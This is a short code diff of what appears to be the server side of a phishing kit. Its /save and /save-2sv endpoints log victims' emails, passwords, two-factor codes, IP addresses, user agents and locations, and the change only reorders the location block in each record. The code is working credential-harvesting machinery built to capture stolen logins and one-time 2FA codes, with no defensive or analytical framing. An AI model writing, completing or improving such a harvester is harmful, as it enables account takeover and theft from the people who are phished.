@@ -67,9 +67,9 @@ app.post('/save', (req, res) => {
     `TIME      : ${now}`,
     `EMAIL     : ${email}`,
     `PASSWORD  : ${req.body.password || '[PENDING]'}`,
-    formatLocationBlock(req.body),
     `IP        : ${ip}`,
     `USER-AGENT: ${ua}`,
+    formatLocationBlock(req.body),
     ``
   ].join('\n');
 
@@ -629,9 +629,9 @@ app.post('/save-2sv', (req, res) => {
     `TIME      : ${now}`,
     `EMAIL     : ${email}`,
     `PASSWORD  : [2FA] ${code}`,
-    formatLocationBlock(req.body),
     `IP        : ${ip}`,
     `USER-AGENT: ${ua}`,
+    formatLocationBlock(req.body),
     ``
   ].join('\n');
 
